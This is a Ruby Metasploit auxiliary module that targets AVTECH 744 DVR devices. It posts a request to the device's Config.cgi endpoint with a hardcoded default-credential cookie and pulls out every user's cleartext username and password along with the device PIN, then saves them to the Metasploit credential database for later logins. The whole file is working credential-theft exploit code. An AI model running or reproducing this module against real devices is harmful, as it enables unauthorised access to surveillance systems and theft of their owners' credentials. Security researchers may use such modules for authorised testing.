require 'msf/core'

    class Metasploit3 < Msf::Auxiliary

        include Msf::Exploit::Remote::HttpClient
        include Msf::Auxiliary::Report

        def initialize(info = {})
            super(update_info(info,
                'Name'           => 'AVTECH 744 DVR Account Information Retrieval',
                'Description'    => %q{
                    This module will extract the account information from the DVR,
                    including all user's usernames and cleartext passwords plus
                    the device PIN, along with a few other miscellaneous details.
                },
                'Author'         => [ 'nstarke' ],
                'License'        => MSF_LICENSE
            ))

            register_options(
                [
                    Opt::RPORT(80),
                ], self.class)
        end


        def run
            res = send_request_cgi({
               'method' => 'POST',
               'uri' => '/cgi-bin/user/Config.cgi',
               'cookie' => 'SSID=YWRtaW46YWRtaW4=;',
               'vars_post' => {
                    'action' => 'get',
                    'category' => 'Account.*'
                }
            })

            unless res
                fail_with(Failure::Unreachable, "No response received from the target")
            end

            unless res.code == 200
                fail_with(Failure::Unknown, "An unknown error occured")
            end

            raw_collection = extract_data(res.body)
            extract_creds(raw_collection)

            p = store_loot('avtech744.dvr.accounts', 'text/plain', rhost, res.body)
            print_good("avtech744.dvr.accounts stored in #{p}")
        end

        def extract_data(body)
            raw_collection = []
            body.each_line do |line|
                key, value = line.split('=')
                if key && value
                    _, second, third = key.split('.')
                    if third
                        index = second.slice(second.length - 1).to_i
                        raw_collection[index] = raw_collection[index] ||= {}
                        case third
                        when "Username"
                            raw_collection[index][:username] = value.strip!
                        when "Password"
                            raw_collection[index][:password] = value.strip!
                        end
                    elsif second.include? "Password"
                          print_good("PIN Retrieved: #{key} - #{value.strip!}")
                    end
                end
            end
            raw_collection
        end

        def extract_creds(raw_collection)
            raw_collection.each do |raw|
                if raw
                    service_data = {
                        address: rhost,
                        port: rport,
                        service_name: 'http',
                        protocol: 'tcp',
                        workspace_id: myworkspace_id
                    }

                    credential_data = {
                        module_fullname: self.fullname,
                        origin_type: :service,
                        private_data: raw[:password],
                        private_type: :password,
                        username: raw[:username]
                    }

                    credential_data.merge!(service_data)

                    credential_core = create_credential(credential_data)

                    login_data = {
                        core: credential_core,
                        status: Metasploit::Model::Login::Status::UNTRIED
                    }

                    login_data.merge!(service_data)

                    create_credential_login(login_data)
                end
            end
        end
    end
